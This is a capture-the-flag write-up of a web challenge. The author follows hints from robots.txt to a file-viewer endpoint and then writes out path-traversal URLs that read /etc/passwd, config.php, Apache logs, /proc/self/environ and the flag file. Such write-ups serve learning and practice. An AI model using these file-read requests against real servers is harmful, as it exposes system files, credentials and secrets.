# ROBOTS_TRAIL
“You enter a virtual maze, a labyrinth of shifting corridors and endless paths. A guardian robot patrols the floor, leaving a 
trail behind as it moves. Follow the path it carves, trace its movements carefully, and uncover the key it leads you to. Only by 
following the robot’s trail can you reach the door to the next floor. 
Challenge: https://therobotstrail.citadel.cryptonitemit.in” 

## MY SOLVE
**Flag:** ` citadel{p4th_tr4v3rs4l_m4st3ry_4ch13v3d}`

### THOUGHT PROCESS/STEPS
We clicked the link in the challenge description and landed on a page with five clickable decoy files — every one led to the same 
dead end. After some time searching the visible UI, we opened the browser devtools and inspected the page source. Hidden in the 
DOM we found this snippet:
<div class="hidden">
<p>Start by checking what this site tells search engine bots in <a href="/robots.txt" style="color: #00bcd4;">robots.txt</a></p>
</div>
That pointed us to https://therobotstrail.citadel.cryptonitemit.in/robots.txt. The robots file contained a hint:
Hint for curious explorers:

Sometimes system files like /etc/passwd can reveal interesting information

Following that hint, we tried the file viewer endpoint with /etc/passwd:

https://therobotstrail.citadel.cryptonitemit.in/file?path=/etc/passwd

That page gave another hint which led us to check:

/var/www/html/config.php

So we loaded:

https://therobotstrail.citadel.cryptonitemit.in/file?path=/var/www/html/config.php

From there, another clue pointed to the webserver logs, so we checked:

https://therobotstrail.citadel.cryptonitemit.in/file?path=/var/log/apache2/access.log
A subsequent hint mentioned environment variables:
Interesting environment variables might be found at /proc/self/environ

We fetched:
https://therobotstrail.citadel.cryptonitemit.in/file?path=/proc/self/environ
Inside /proc/self/environ we discovered an environment entry:

SECRET_LOCATION=/home/ctf/.secret

That led us to:
https://therobotstrail.citadel.cryptonitemit.in/file?path=/home/ctf/.secret

The directory listing there showed:

Directory listing for /home/ctf/.secret:
total 12
drwx------ 2 ctf ctf 4096 Jan 1 10:00 .
drwxr-xr-x 5 ctf ctf 4096 Jan 1 09:55 ..
-r-------- 1 ctf ctf 48 Jan 1 10:00 flag.txt

So we opened:
https://therobotstrail.citadel.cryptonitemit.in/file?path=/home/ctf/.secret/flag.txt
and retrieved the flag.

## WHAT I LEARNT 
I learnt patience
